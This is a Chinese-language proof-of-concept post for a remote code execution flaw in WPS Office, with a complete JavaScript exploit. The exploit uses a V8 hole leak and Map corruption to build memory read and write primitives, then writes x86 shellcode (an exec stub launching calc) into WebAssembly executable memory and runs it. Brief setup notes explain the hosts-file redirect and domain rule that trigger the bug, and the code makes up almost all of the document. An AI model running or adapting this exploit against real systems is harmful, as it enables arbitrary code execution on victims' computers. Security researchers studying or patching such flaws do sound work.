## 金山WPS RCE

wps影响范围为：WPS Office 2023 个人版 < 11.1.0.15120
WPS Office 2019 企业版 < 11.8.2.12085
POC
在1.html当前路径下启动http server并监听80端口，修改hosts文件（测试写死的） 
127.0.0.1 clientweb.docer.wps.cn.cloudwps.cn

漏洞触发需让域名规则满足clientweb.docer.wps.cn.{xxxxx}wps.cn cloudwps.cn和wps.cn没有任何关系
代码块在底下。（需要原pdf加wechat）
```
<script>
if(typeof alert === "undefined"){
alert = console.log;
}
let f64 = new Float64Array(1);
let u32 = new Uint32Array(f64.buffer);
function d2u(v) {
f64[0] = v;
return u32;
}
function u2d(lo, hi) {
u32[0] = lo;
u32[1] = hi;
return f64[0];
}
function gc(){ // major
for (let i = 0; i < 0x10; i++) {
new Array(0x100000);
}
}
function foo(bug) {
function C(z) {
Error.prepareStackTrace = function(t, B) {
return B[z].getThis();
};
let p = Error().stack;
Error.prepareStackTrace = null;
return p;
}
function J() {}
var optim = false;
var opt = new Function(
'a', 'b', 'c',
'if(typeof a===\'number\'){if(a>2){for(var
i=0;i<100;i++);return;}b.d(a,b,1);return}' +
'g++;'.repeat(70));
var e = null;
J.prototype.d = new Function(
'a', 'b', '"use strict";b.a.call(arguments,b);return arguments[a];');
J.prototype.a = new Function('a', 'a.b(0,a)');
J.prototype.b = new Function(
'a', 'b',
'b.c();if(a){' +
'g++;'.repeat(70) + '}');
J.prototype.c = function() {
if (optim) {
var z = C(3);
var p = C(3);
z[0] = 0;
e = {M: z, C: p};
}
};
var a = new J();
// jit optim
if (bug) {
for (var V = 0; 1E4 > V; V++) {
opt(0 == V % 4 ? 1 : 4, a, 1);
}
}
optim = true;
opt(1, a, 1);
return e;
}
e1 = foo(false);
e2 = foo(true);
delete e2.M[0];
let hole = e2.C[0];
let map = new Map();
map.set('asd', 8);
map.set(hole, 0x8);
map.delete(hole);
map.delete(hole);
map.delete("asd");
map.set(0x20, "aaaa");
let arr3 = new Array(0);
let arr4 = new Array(0);
let arr5 = new Array(1);
let oob_array = [];
oob_array.push(1.1);
map.set("1", -1);
let obj_array = {
m: 1337, target: gc
};
let ab = new ArrayBuffer(1337);
let object_idx = undefined;
let object_idx_flag = undefined;
let max_size = 0x1000;
for (let i = 0; i < max_size; i++) {
if (d2u(oob_array[i])[0] === 0xa72) {
object_idx = i;
object_idx_flag = 1;
break;
}if (d2u(oob_array[i])[1] === 0xa72) {
object_idx = i + 1;
object_idx_flag = 0;
break;
}
}
function addrof(obj_para) {
obj_array.target = obj_para;
let addr = d2u(oob_array[object_idx])[object_idx_flag] - 1;
obj_array.target = gc;
return addr;
}
function fakeobj(addr) {
let r8 = d2u(oob_array[object_idx]);
if (object_idx_flag === 0) {
oob_array[object_idx] = u2d(addr, r8[1]);
}else {
oob_array[object_idx] = u2d(r8[0], addr);
}
return obj_array.target;
}
let bk_idx = undefined;
let bk_idx_flag = undefined;
for (let i = 0; i < max_size; i++) {
if (d2u(oob_array[i])[0] === 1337) {
bk_idx = i;
bk_idx_flag = 1;
break;
}if (d2u(oob_array[i])[1] === 1337) {
bk_idx = i + 1;
bk_idx_flag = 0;
break;
}
}
let dv = new DataView(ab);
function get_32(addr) {
let r8 = d2u(oob_array[bk_idx]);
if (bk_idx_flag === 0) {
oob_array[bk_idx] = u2d(addr, r8[1]);
} else {
oob_array[bk_idx] = u2d(r8[0], addr);
}
let val = dv.getUint32(0, true);
oob_array[bk_idx] = u2d(r8[0], r8[1]);
return val;
}
function set_32(addr, val) {
let r8 = d2u(oob_array[bk_idx]);
if (bk_idx_flag === 0) {
oob_array[bk_idx] = u2d(addr, r8[1]);
} else {
oob_array[bk_idx] = u2d(r8[0], addr);
}
dv.setUint32(0, val, true);
oob_array[bk_idx] = u2d(r8[0], r8[1]);
}
function write8(addr, val) {
let r8 = d2u(oob_array[bk_idx]);
if (bk_idx_flag === 0) {
oob_array[bk_idx] = u2d(addr, r8[1]);
} else {
oob_array[bk_idx] = u2d(r8[0], addr);
}
dv.setUint8(0, val);
}
let fake_length = get_32(addrof(oob_array)+12);
set_32(get_32(addrof(oob_array)+8)+4,fake_length);
let wasm_code = new
Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,
128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,
128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0
,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
let wasm_mod = new WebAssembly.Module(wasm_code);
let wasm_instance = new WebAssembly.Instance(wasm_mod);
let f = wasm_instance.exports.main;
let target_addr = addrof(wasm_instance)+0x40;
let rwx_mem = get_32(target_addr);
//alert("rwx_mem is"+rwx_mem.toString(16));
const shellcode = new Uint8Array([0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89,
0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30,0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14,
0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff,0xac, 0x3c, 0x61, 0x7c,
0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52,0x57, 0x8b,
0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01,
0xd1,0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49,
0x8b, 0x34, 0x8b,0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7,
0x38, 0xe0, 0x75, 0xf6, 0x03,0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe4, 0x58,
0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b,0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01,
0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24,0x24, 0x5b, 0x5b, 0x61,
0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a, 0x8b, 0x12, 0xeb,0x8d, 0x5d,
0x6a, 0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00, 0x00, 0x50, 0x68, 0x31, 0x8b,
0x6f,0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x68, 0xa6, 0x95, 0xbd,
0x9d, 0xff, 0xd5,0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
0x47, 0x13, 0x72, 0x6f, 0x6a,0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63,
0x00]);
for(let i=0;i<shellcode.length;i++){
write8(rwx_mem+i,shellcode[i]);
}
f();
</script>
```
